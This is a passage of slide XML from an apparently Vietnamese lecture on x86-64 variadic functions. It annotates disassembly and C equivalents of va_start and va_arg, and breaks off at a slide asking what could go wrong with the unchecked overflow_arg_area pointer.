              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x000000000040049e &lt;+56&gt;:   0f 29 45 80                       movaps XMMWORD PTR [rbp-0x80],xmm0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004a2 &lt;+60&gt;:   0f 29 4d 90                       movaps XMMWORD PTR [rbp-0x70],xmm1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004a6 &lt;+64&gt;:   0f 29 55 a0                       movaps XMMWORD PTR [rbp-0x60],xmm2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004aa &lt;+68&gt;:   0f 29 5d b0                       movaps XMMWORD PTR [rbp-0x50],xmm3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004ae &lt;+72&gt;:   0f 29 65 c0                       movaps XMMWORD PTR [rbp-0x40],xmm4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004b2 &lt;+76&gt;:   0f 29 6d d0                       movaps XMMWORD PTR [rbp-0x30],xmm5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004b6 &lt;+80&gt;:   0f 29 75 e0                       movaps XMMWORD PTR [rbp-0x20],xmm6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x00000000004004ba &lt;+84&gt;:   0f 29 7d f0                       movaps XMMWORD PTR [rbp-0x10],xmm7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="4114800"/>
            <a:ext cx="10114560" cy="1468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600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Lưu giá trị của các thanh ghi XMM0–XMM7 vào </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>vùng nhớ trong stack frame để có thể truy cập các floating-point arguments sau này.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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4" name="TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="2901240" cy="5148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790" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEBUG — va_start</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2790" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="TextBox 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1190520"/>
            <a:ext cx="10964880" cy="155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0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>   ; Set overflow_area =  rbp+0x10</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   0x00000000004004dd &lt;+119&gt;:   48 8d 45 10             lea    rax,[rbp+0x10]</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   0x00000000004004e1 &lt;+123&gt;:   48 89 85 28 ff ff ff    mov    QWORD PTR [rbp-0xd8],rax</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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>   ; Set reg_save_area = rbp-0x10</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   0x00000000004004e8 &lt;+130&gt;:   48 8d 85 50 ff ff ff    lea    rax,[rbp-0xb0]</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onsolas"/>
              </a:rPr>
              <a:t>   0x00000000004004ef &lt;+137&gt;:   48 89 85 30 ff ff ff    mov    QWORD PTR [rbp-0xd0],rax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1379160" y="3679920"/>
            <a:ext cx="5935320" cy="16736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2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Set giá trị cho 2 field sau : </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>overflow_arg_area  = rbp+0x10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>reg_save_area = rbp-0xb0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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7" name="TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="2966760" cy="54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DEBUG — va_arg </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1097280"/>
            <a:ext cx="10964880" cy="52131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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>; Kiểm tra còn argument trong register save area không</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0x40050c: mov eax, DWORD PTR [rbp-0xe0]  ; eax = gp_offset</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0x400512: cmp eax, 0x2f</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0x400515: ja  0x40053a                  ; nếu &gt; 47 thì đọc từ stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>; Đọc argument từ register save area</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0x400517: mov rax, QWORD PTR [rbp-0xd0] ; rax = reg_save_area</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0x40051e: mov edx, DWORD PTR [rbp-0xe0] ; edx = gp_offset</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0x400526: add rax, rdx                  ; rax = reg_save_area + gp_offset</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>; Cập nhật gp_offset += 8</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0x400529: mov edx, DWORD PTR [rbp-0xe0]</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0x40052f: add edx, 0x8</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0x400532: mov DWORD PTR [rbp-0xe0], edx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x400538: jmp 0x40054c</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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 Nhánh đọc argument từ stack (overflow_arg_area)</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0x40053a: mov rax, QWORD PTR [rbp-0xd8] ; rax = overflow_arg_area</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0x400541: lea rdx, [rax+0x8]            ; pointer += 8</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0x400545: mov QWORD PTR [rbp-0xd8], rdx ; cập nhật pointer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>; Lấy giá trị argument</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x40054c: mov eax, DWORD PTR [rax]</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9" name="TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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000" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Đổi sang C — nó như thế này :</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="4307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2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>int value;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>if (gp_offset &lt;= 47) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    value = *(int *)(reg_save_area + gp_offset);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    gp_offset += 8;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>} else {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    value = *(int *)overflow_arg_area;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    overflow_arg_area += 8;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Kiểm tra xem liệu đã sử dụng hết argument trong register chưa (gp_offset &lt;= 47)  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sau đó thì lấy từ vùng overflow_arg_area , tức stack argument. </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TextBox 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="3507840" cy="5166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spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>What could go wrong ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="142" name="TextBox 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="914400"/>
            <a:ext cx="10964880" cy="27820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endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ta biết overflow_arg_area bắt đầu từ stack argument ?  Mỗi lần gọi va_arg nó lại +=8 và  không có  bất kỳ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
